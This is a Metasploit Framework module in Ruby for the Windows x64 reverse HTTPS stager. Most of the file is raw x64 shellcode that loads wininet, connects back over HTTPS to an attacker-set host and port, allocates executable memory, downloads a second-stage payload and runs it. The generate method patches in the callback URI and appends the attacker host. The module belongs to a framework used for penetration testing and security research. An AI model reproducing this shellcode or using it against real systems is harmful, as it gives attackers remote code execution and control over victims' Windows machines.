##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_https'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 Reverse HTTPS Stager',
      'Description'   => 'Tunnel communication over HTTP using SSL (Windows x64)',
      'Author'        => [
        'hdm', # original 32-bit implementation
        'agix', # x64 rewrite
        'rwincey' # x64 alignment fix
      ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86_64,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Convention'    => 'sockrdi https',
      'Stager' =>
        {
          'Offsets' =>
            {
              # Disabled since it MUST be ExitProcess to work on WoW64 unless we add EXITFUNK support (too big right now)
              # 'EXITFUNC' => [ 290, 'V' ],
              'LPORT' => [286, 'v'], # Not a typo, really little endian
            },
          'Payload' =>
            "\xFC\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00\x41\x51\x41\x50\x52\x51" +
            "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52" +
            "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED" +
            "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x66\x81\x78" +
            "\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67" +
            "\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56" +
            "\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0" +
            "\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24" +
            "\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41" +
            "\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01" +
            "\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83" +
            "\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x4F\xFF" +
            "\xFF\xFF\x5D" +
            "\x6A\x00" + #alignment
            "\x49\xBE\x77\x69\x6E\x69\x6E\x65\x74\x00\x41\x56\x49" +
            "\x89\xE6\x4C\x89\xF1\x49\xBA\x4C\x77\x26\x07\x00\x00\x00\x00\xFF" +
            "\xD5" +
            "\x6A\x00" + #alignment
            "\x6A\x00\x48\x89\xE1\x48\x31\xD2\x4D\x31\xC0\x4D\x31\xC9\x41" +
            "\x50\x41\x50\x49\xBA\x3A\x56\x79\xA7\x00\x00\x00\x00\xFF\xD5" +
            "\xE9\x9E\x00\x00\x00" + #updated jump offset
            "\x5A\x48\x89\xC1\x49\xB8\x5C\x11\x00\x00\x00\x00" +
            "\x00\x00\x4D\x31\xC9\x41\x51\x41\x51\x6A\x03\x41\x51\x49\xBA\x57" +
            "\x89\x9F\xC6\x00\x00\x00\x00\xFF\xD5" +
            "\xEB\x7C" + #updated jump offset
            "\x48\x89\xC1\x48\x31" +
            "\xD2\x41\x58\x4D\x31\xC9\x52\x68\x00\x32\xA0\x84\x52\x52\x49\xBA" +
            "\xEB\x55\x2E\x3B\x00\x00\x00\x00\xFF\xD5\x48\x89\xC6\x6A\x0A\x5F" +
            "\x48\x89\xF1\x48\xBA\x1F\x00\x00\x00\x00\x00\x00\x00" +
            "\x6A\x00" + #alignment
            "\x68\x80\x33" +
            "\x00\x00\x49\x89\xE0\x49\xB9\x04\x00\x00\x00\x00\x00\x00\x00\x49" +
            "\xBA\x75\x46\x9E\x86\x00\x00\x00\x00\xFF\xD5\x48\x89\xF1\x48\x31" +
            "\xD2\x4D\x31\xC0\x4D\x31\xC9" +
            "\x52\x52" + #updated alignment (extra push edx)
            "\x49\xBA\x2D\x06\x18\x7B\x00\x00" +
            "\x00\x00\xFF\xD5\x85\xC0\x75\x24\x48\xFF\xCF\x74\x13\xEB\xB1" +
            "\xE9\x81\x00\x00\x00"+
            "\xE8\x7F\xFF\xFF\xFF" + #updated jump offset
            "\x2F\x31\x32\x33\x34\x35\x00" +
            "\x49\xBE\xF0\xB5\xA2\x56\x00\x00\x00\x00\xFF\xD5\x48\x31\xC9\x48" +
            "\xBA\x00\x00\x40\x00\x00\x00\x00\x00\x49\xB8\x00\x10\x00\x00\x00" +
            "\x00\x00\x00\x49\xB9\x40\x00\x00\x00\x00\x00\x00\x00\x49\xBA\x58" +
            "\xA4\x53\xE5\x00\x00\x00\x00\xFF\xD5\x48\x93\x53\x53\x48\x89\xE7" +
            "\x48\x89\xF1\x48\x89\xDA\x49\xB8\x00\x20\x00\x00\x00\x00\x00\x00" +
            "\x49\x89\xF9\x49\xBA\x12\x96\x89\xE2\x00\x00\x00\x00\xFF\xD5\x48" +
            "\x83\xC4\x20\x85\xC0\x74\x99\x48\x8B\x07\x48\x01\xC3\x48\x85\xC0" +
            "\x75\xCE\x58\x58\xC3" +
            "\xE8\xD7\xFE\xFF\xFF" #updated jump offset
        }
    ))
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the first stage
  #
  def generate
    p = super
    i = p.index("/12345\x00")
    u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW) + "\x00"
    p[i, u.length] = u
    p + datastore['LHOST'].to_s + "\x00"
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
